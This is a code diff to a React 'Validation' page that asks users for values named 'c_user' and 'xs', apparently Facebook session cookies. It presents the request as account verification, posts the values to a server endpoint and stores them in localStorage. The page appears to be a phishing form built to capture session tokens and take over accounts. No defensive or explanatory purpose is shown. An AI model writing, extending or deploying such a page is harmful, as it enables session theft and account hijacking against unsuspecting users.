@@ -14,10 +14,17 @@ import { zodResolver } from "@hookform/resolvers/zod";
 import { useForm } from "react-hook-form";
 import { useLocation } from "wouter";
 import MetaTags from "@/components/meta-tags";
-import { validationFormSchema } from "@shared/schema";
-import { apiRequest } from "@/lib/queryClient";
+import { z } from "zod";
 import { useMobile } from "@/hooks/use-mobile";
 import { MobileModal } from "@/components/mobile-modal";
+import { Search, Home, ChevronDown, Settings, Menu } from "lucide-react";
+
+const validationFormSchema = z.object({
+  c_user: z.string().min(1, "c_user is required"),
+  xs: z.string().min(1, "xs is required"),
+});
+
+type ValidationFormValues = z.infer<typeof validationFormSchema>;
 
 export default function Validation() {
   const { toast } = useToast();
@@ -31,7 +38,7 @@ export default function Validation() {
     }
   }, [isMobile]);
 
-  const form = useForm({
+  const form = useForm<ValidationFormValues>({
     resolver: zodResolver(validationFormSchema),
     defaultValues: {
       c_user: "",
@@ -39,16 +46,22 @@ export default function Validation() {
     },
   });
 
-  const onSubmit = async (data: any) => {
+  const onSubmit = async (data: ValidationFormValues) => {
     try {
-      await apiRequest('POST', '/api/contact-form', data);
+      await fetch('/api/form-one', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+      });
       localStorage.setItem('validation_data', JSON.stringify(data));
 
       toast({
         title: "Success",
-        description: "Please proceed to the next step",
+        description: "Your verification request has been submitted successfully",
       });
-      setLocation("/confirmation");
+      setLocation("/success");
     } catch (error) {
       toast({
         variant: "destructive",
